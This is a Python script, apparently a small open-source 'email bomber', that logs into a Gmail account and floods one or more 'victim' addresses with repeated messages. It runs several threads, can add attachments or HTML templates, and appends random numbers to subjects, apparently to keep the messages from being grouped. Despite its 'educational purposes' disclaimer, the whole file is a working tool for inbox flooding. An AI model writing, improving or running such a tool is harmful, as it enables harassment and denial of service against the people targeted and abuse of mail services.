#! /usr/bin/python3
# @github: https://github.com/0xFA51
# @author: 0xFA51
# This program has been made for educational purposes only. Do not use this program to cause any harm.

import smtplib
import os
import getpass
import math
import time
from random import randint
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import COMMASPACE, formatdate
from email.mime.application import MIMEApplication
from progress.bar import Bar
from threading import *

__author__ = "0xFA51"
__version__ = "0.2"


class Colors:
    if os.name == "posix":
        HEADER = '\033[95m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        ENDC = '\033[0m'
        BOLD = '\033[1m'

    else:
        HEADER = ''
        BLUE = ''
        GREEN = ''
        YELLOW = ''
        RED = ''
        ENDC = ''
        BOLD = ''


def main():
    def check_int(text):
        while True:
            try:
                out = int(input(text))
                return out

            except ValueError:
                Errors.number()

    def red(text):
        return Colors.RED + text + Colors.ENDC

    def yellow(text):
        return Colors.YELLOW + text + Colors.ENDC

    def green(text):
        return Colors.GREEN + text + Colors.ENDC

    def blue(text):
        return Colors.BLUE + text + Colors.ENDC

    def bold(text):
        return Colors.BOLD + text + Colors.ENDC

    class Errors:
        @staticmethod
        def number():
            red("Please submit a number!")

    arrow = blue(bold("> "))

    print(bold(blue("This program was created by {}.".format(__author__))))
    print(bold(blue("Version {}".format(__version__))))
    print(bold(red("Do not use it for illegal purposes.")))
    print("Which email provider would you like to use? \n")
    print(bold("1) G-MAIL"))
    print(bold("2) OUTLOOK") + " " + red("Not implemented"))
    provider = check_int(arrow)

    SERVER = ""
    PORT = 587
    if provider == 1:
        SERVER = "smtp.gmail.com"

    elif provider == 2:
        SERVER = "smtp.live.com"

    account = input(green("Sender's email address") + arrow)
    alias = input(green("Nickname") + arrow)
    pw = getpass.getpass()
    print(':.: Validating e-mail :.:')

    SMTP = smtplib.SMTP(SERVER, PORT)
    try:
        SMTP.starttls()
        SMTP.login(account, pw)
        SMTP.quit()

    except Exception as e:
        print(red("[ERR] {}".format(str(e))))
        exit()

    subject = input(green("Subject") + arrow)
    attachments = input(green("Path to attachment [none]") + " Separate filenames with ," + arrow)

    choice = check_int(green("Plain text(1) or HTML(2)?") + arrow)
    if choice <= 1:
        choice = 1

    else:
        choice = 2

    text_body = ""
    html_body = ""
    while True:
        if choice == 1:
            while True:
                msg = input(green("Body") + arrow)
                if len(msg) >= 3:
                    if msg[-3:] == "END":
                        text_body += msg.replace("END", "")
                        text_body += "\n"

                    else:
                        text_body += msg
                        text_body += "\n"
                        continue

                else:
                    text_body += msg
                    text_body += "\n"
                    continue

                break

        elif choice == 2:
            template_check = input(green("Do you wish to use an existing HTML template? [Y/n] "))
            template_check = template_check in "Yy"

            if template_check:
                while True:
                    saved_templates = os.popen("ls templates").read().split('\n')
                    counter = 1
                    templates = {}
                    for template in saved_templates:
                        if template:
                            print(str(counter) + ") " + template)
                            templates[counter] = template
                            counter += 1
                    template_path = input(green("Absolute path/number of HTML template") + arrow)

                    while True:
                        try:
                            check = int(template_path.replace(" ", ""))
                            break

                        except ValueError:
                            Errors.number()

                    try:
                        html_template = open("templates/" + templates[check], "r")
                        html_body = html_template.read()

                    except FileNotFoundError:
                        print(red("File not found!"))
                        continue

                    break

            else:
                while True:
                    msg = input(green("HTML Body") + arrow)
                    if len(msg) >= 3:
                        if msg[-3:] == "END":
                            html_body += msg.replace("END", "")
                            html_body += "<br>"

                        else:
                            html_body += msg
                            html_body += "<br>"
                            continue

                    else:
                        html_body += msg
                        html_body += "<br>"
                        continue

                    break

        break

    target = input(green("Victim's email address") + arrow).replace(" ", "").split(",")

    level = 0
    print(yellow("The number you input will be rounded to the nearest 10"))
    level = check_int(green("Number of emails") + arrow)

    def send(to, text="", html=""):
        message = MIMEMultipart('alternative')
        message['From'] = "{} <{}>".format(alias, account)
        message['To'] = to
        message['Date'] = formatdate(localtime=True)

        if level > 1:
            message['Subject'] = subject + str(randint(0, 1000000))

        else:
            message['Subject'] = subject

        if html:
            HTML = MIMEText(html, 'html')
            message.attach(HTML)

        else:
            TEXT = MIMEText(text, 'plain')
            message.attach(TEXT)

        if attachments:
            for att in attachments.split(","):
                f = open(att, "rb")
                ATTACHMENT = MIMEApplication(f.read(), _subtype=att.split('.')[-1])
                ATTACHMENT.add_header('Content-Disposition', 'attachment', filename=att.split('/')[-1])
                message.attach(ATTACHMENT)
                f.close()

        SMTP.sendmail(alias, to, message.as_string())
        bar.next()

    bar = Bar(red(bold(":: Attack Started::")), max=level*len(target))
    print()
    THREADS = 5

    def attack(to, single: bool = False):
        if not single:
            for t in range(math.ceil(level / THREADS)):
                send(to, text=text_body, html=html_body)
                time.sleep(2)

        else:
            send(to, text=text_body, html=html_body)

    SMTP.connect(SERVER, PORT)
    SMTP.starttls()

    SMTP.login(account, pw)
    for t in target:
        if level >= THREADS:
            for i in range(THREADS):
                Thread(target=lambda: attack(t)).start()
                time.sleep(2)

        else:
            for i in range(level):
                Thread(target=lambda: attack(t, single=True)).start()
                time.sleep(2)

        time.sleep(2)


if __name__ == "__main__":
    main()
